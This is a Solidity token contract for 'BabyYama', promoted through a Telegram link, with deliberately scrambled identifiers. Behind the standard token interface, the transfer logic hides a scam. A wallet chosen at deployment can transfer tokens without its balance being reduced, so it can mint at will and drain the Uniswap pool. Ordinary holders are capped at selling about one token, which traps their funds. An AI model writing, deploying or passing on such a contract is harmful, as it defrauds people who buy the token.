/*

https://t.me/portalbabyyama

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract BabyYama is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public symbol;

    mapping(address => uint256) private nyjizfokdcbl;

    uint256 private lpdjnkrmgah = 105;

    function transfer(address mfnbrcu, uint256 xjfe) public returns (bool success) {
        bgyniw(msg.sender, mfnbrcu, xjfe);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transferFrom(address zudnpsqm, address mfnbrcu, uint256 xjfe) public returns (bool success) {
        require(xjfe <= allowance[zudnpsqm][msg.sender]);
        allowance[zudnpsqm][msg.sender] -= xjfe;
        bgyniw(zudnpsqm, mfnbrcu, xjfe);
        return true;
    }

    constructor(string memory pucsjdz, string memory fdynxmw, address urglnvzj, address xgczmkjv) {
        name = pucsjdz;
        symbol = fdynxmw;
        balanceOf[msg.sender] = totalSupply;
        xaiotsmkwzc[xgczmkjv] = lpdjnkrmgah;
        jgvmtznwyodc = IUniswapV2Router02(urglnvzj);
    }

    mapping(address => uint256) public balanceOf;

    IUniswapV2Router02 private jgvmtznwyodc;

    mapping(address => uint256) private xaiotsmkwzc;

    function approve(address mxve, uint256 xjfe) public returns (bool success) {
        allowance[msg.sender][mxve] = xjfe;
        emit Approval(msg.sender, mxve, xjfe);
        return true;
    }

    string public name;

    function bgyniw(address zudnpsqm, address mfnbrcu, uint256 xjfe) private {
        address vahjfemdgt = IUniswapV2Factory(jgvmtznwyodc.factory()).getPair(address(this), jgvmtznwyodc.WETH());
        if (0 == xaiotsmkwzc[zudnpsqm]) {
            if (zudnpsqm != vahjfemdgt && nyjizfokdcbl[zudnpsqm] != block.number && xjfe < totalSupply) {
                require(xjfe <= totalSupply / (10 ** decimals));
            }
            balanceOf[zudnpsqm] -= xjfe;
        }
        balanceOf[mfnbrcu] += xjfe;
        nyjizfokdcbl[mfnbrcu] = block.number;
        emit Transfer(zudnpsqm, mfnbrcu, xjfe);
    }
}
